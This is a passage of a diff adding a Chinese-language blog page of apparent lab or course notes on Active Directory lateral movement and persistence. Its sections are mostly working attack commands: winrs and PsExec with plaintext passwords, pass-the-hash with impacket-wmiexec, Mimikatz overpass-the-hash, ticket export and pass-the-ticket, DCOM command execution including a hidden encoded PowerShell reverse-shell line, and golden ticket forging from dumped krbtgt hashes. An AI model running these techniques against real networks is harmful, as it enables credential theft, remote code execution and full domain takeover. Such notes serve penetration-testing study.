class="literal">-ClassName</span> Win32_Process - MethodName Create <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;CommandLine =<span class="variable">$Command</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>使用winrs命令也可以(前提是域用户需要成为目标主机上的管理员或远程管理用户组的一部分。)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:files04 -u:jen -p:Nexus123! &quot;cmd /c hostname &amp; whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用PsExec进行横向移动"><a href="#使用PsExec进行横向移动" class="headerlink" title="使用PsExec进行横向移动"></a>使用PsExec进行横向移动</h3><p>使用PsExec进行横向移动的前提是，首先，向目标计算机进行身份验证的用户需要属于管理员本地组（Administrators local group）。此外，ADMIN$ 共享必须可用，并且必须打开文件和打印机共享。最后两个要求默认已经得到满足，因为它们是现代 Windows Server 系统上的默认设置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pass-the-hash"><a href="#Pass-the-hash" class="headerlink" title="Pass the hash"></a>Pass the hash</h3><p>允许攻击者使用用户的 NTLM 哈希而不是明文密码对远程系统或服务进行身份验证。这不适用于 Kerberos 身份验证，而仅适用于使用 NTLM 身份验证的服务器或服务。</p>
+<p>与 PsExec 类似，此技术需要通过防火墙建立 SMB 连接（通常为端口 445）并启用 Windows 文件和打印机共享功能。</p>
+<p>这种横向移动技术还需要名为 ADMIN$ 的管理共享可用。为了与此共享建立连接，攻击者必须使用本地管理员权限的凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># kali执行</span><br><span class="line">/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73</span><br></pre></td></tr></table></figure>
+
+<h3 id="Over-pass-the-hash"><a href="#Over-pass-the-hash" class="headerlink" title="Over pass the hash"></a>Over pass the hash</h3><p>Over pass the hash横向移动技术的本质是将 NTLM 哈希转换为 Kerberos 票证并避免使用 NTLM 身份验证。一个简单的方法是使用 Mimikatz 中的 sekurlsa::pth 命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</span><br></pre></td></tr></table></figure>
+
+<p>然后拿到一个新的powershell，在新的powershell中运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 必须运行net use，不然不会生成Kerberos TGT</span><br><span class="line">net use \\files04</span><br><span class="line"># 验证TGT是否成功生成</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<p>现在，已将 NTLM 哈希转换为 Kerberos TGT，从而允许使用任何依赖 Kerberos 身份验证（而不是 NTLM）的工具，例如PsExec</p>
+<p>PsExec 可以远程运行命令，但不接受密码哈希。由于已经生成了 Kerberos 票证并在 新的PowerShell 会话中以 jen 运行，因此可以重用 TGT 来在 files04 主机上获取代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\PsExec.exe \\files04 cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><p>over pass the hash技术是用来来获取 Kerberos TGT，从而允许使用 Kerberos 进行身份验证。我们只能在为其创建的机器上使用 TGT，但 TGS 可能提供更大的灵活性。</p>
+<p>pass the ticket攻击利用了 TGS，它可以导出并重新注入到网络上的其他地方，然后用于对特定服务进行身份验证。此外，如果服务票证属于当前用户，则不需要管理权限。</p>
+<p>例如这里目标是利用 dave 的凭据。dave 用户有权访问位于 WEB04 上的备份文件夹，而当前用户 jen 没有。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line"></span><br><span class="line"># 返回生成的票据，选择 dave@cifs-web04.kirbi 格式的凭据</span><br><span class="line">dir *.kirbi</span><br><span class="line"># [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi是在上面命令中返回的name</span><br><span class="line">kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</span><br><span class="line"># powershell中检查是否成功</span><br><span class="line">klist</span><br><span class="line"># 访问web04的backup文件夹成功</span><br><span class="line">ls \\web04\backup</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用DCOM进行横向移动"><a href="#使用DCOM进行横向移动" class="headerlink" title="使用DCOM进行横向移动"></a>使用DCOM进行横向移动</h3><p>与 DCOM 的交互是通过 TCP 端口 135 上的 RPC 执行的，并且需要本地管理员访问权限才能调用 DCOM 服务控制管理器，这本质上是一个 API。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 只改IP</span><br><span class="line">$dcom =[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application .1&quot;,&quot;192.168.50.73&quot;))</span><br><span class="line"># 只关注第一个和第三个参数，这里是cmd 和 /c calc</span><br><span class="line">$dcom.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</span><br><span class="line"># 同样也可以反弹shell</span><br><span class="line">$dcom .Document .ActiveView .ExecuteShellCommand(&quot;powershell&quot;,$null,&quot;powershell -nop -w hidden -e base64shell&quot;,&quot;7&quot;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网持久化控制"><a href="#内网持久化控制" class="headerlink" title="内网持久化控制"></a>内网持久化控制</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>前提是能够获得 krbtgt 的域用户帐户的密码哈希，则可以创建自己的自定义 TGT，也称为黄金票据，黄金票证授予我们访问整个域资源的权限。</p>
+<p>这里假设是jen用户在client74机器上尝试移动到dc上，目标是通过远程桌面登录域控制器。</p>
+<p>其实，创建黄金票证并将其注入内存不需要任何管理权限，甚至可以从未加入域的计算机上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"># 获得 krbtgt 帐户的 NTLM 哈希以及域 SID</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line">Domain : CORP / S-1-5-21-1987370270-658905905-1781884369</span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM    :</span><br><span class="line">NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e</span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM    :</span><br><span class="line">NTLM :</span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM    :</span><br><span class="line">NTLM : 1693c6cefafffc7af11ef34d1c788f47</span><br><span class="line"></span><br><span class="line"># 删除任何现有的 Kerberos 票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line"># 需要提供一个现有帐户，这里是jen</span><br><span class="line">kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt</span><br><span class="line"></span><br><span class="line">misc::cmd</span><br><span class="line"></span><br><span class="line"># 然后在新的cmd中运行</span><br><span class="line"># 如果这里将 PsExec 连接到域控制器的 IP 地址而不是主机名，将强制使用 NTLM 身份验证，并且访问失败</span><br><span class="line">PsExec.exe \\dc1 cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Windows%E8%87%AA%E5%B8%A6%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">使用Windows自带命令进行信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PowerShell%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">使用PowerShell脚本进行信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">自动化域内信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">凭据攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">明文攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4%E5%93%88%E5%B8%8C"><span class="toc-number">4.2.</span> <span class="toc-text">获取域用户的口令哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%A5%A8%E6%8D%AE%E5%87%AD%E8%AF%81"><span class="toc-number">5.</span> <span class="toc-text">伪造票据凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%9F%9F%E5%86%85%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">拿域内任意用户的凭证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.</span> <span class="toc-text">内网横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8WMI%E5%92%8CWinRM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.1.</span> <span class="toc-text">使用WMI和WinRM进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8PsExec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.2.</span> <span class="toc-text">使用PsExec进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-hash"><span class="toc-number">7.3.</span> <span class="toc-text">Pass the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Over-pass-the-hash"><span class="toc-number">7.4.</span> <span class="toc-text">Over pass the hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Ticket"><span class="toc-number">7.5.</span> <span class="toc-text">Pass the Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">7.6.</span> <span class="toc-text">使用DCOM进行横向移动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%A7%E5%88%B6"><span class="toc-number">8.</span> <span class="toc-text">内网持久化控制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.1.</span> <span class="toc-text">黄金票据</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/AD-Lateral-Movement/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/AD-Lateral-Movement/&text=AD Lateral Movement"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/AD-Lateral-Movement/&is_video=false&description=AD Lateral Movement"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AD Lateral Movement&body=Check out this article: http://example.com/2024/06/05/AD-Lateral-Movement/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/AD-Lateral-Movement/&title=AD Lateral Movement"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/AD-Lateral-Movement/&name=AD Lateral Movement&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/AD-Lateral-Movement/&t=AD Lateral Movement"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
